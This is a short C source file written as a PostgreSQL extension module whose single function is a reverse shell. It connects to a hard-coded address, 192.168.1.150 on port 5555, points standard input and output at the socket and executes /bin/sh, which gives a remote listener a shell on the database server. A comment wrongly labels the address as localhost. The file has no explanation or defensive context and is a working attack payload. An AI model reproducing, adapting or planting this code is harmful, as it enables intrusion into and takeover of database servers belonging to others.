#include <postgres.h>
#include <string.h>
#include "fmgr.h"
#include<stdio.h>
#include<sys/socket.h>    //socket
#include<arpa/inet.h> //inet_addr

#ifdef PG_MODULE_MAGIC
PG_MODULE_MAGIC;
#endif
int
add_one12()
{
    int sockfd;         // file descriptor for socket
    int lportno = 5555;    // listener port
    struct sockaddr_in serv_addr; // {2,str[14]}
    char *const params[] = {"/bin/sh",NULL};
    char *const environ[] = {NULL};

    sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    serv_addr.sin_family = AF_INET; // 2
    serv_addr.sin_addr.s_addr = inet_addr("192.168.1.150"); // localhost
    serv_addr.sin_port = htons(lportno);  // little endian
    connect(sockfd, (struct sockaddr *) &serv_addr, 16);
    // redirect stdout and stderr
    dup2(sockfd,0); // stdin
    dup2(0,1); // stdout
    dup2(0,2); // stderr
    execve("/bin/sh",params,environ);
}

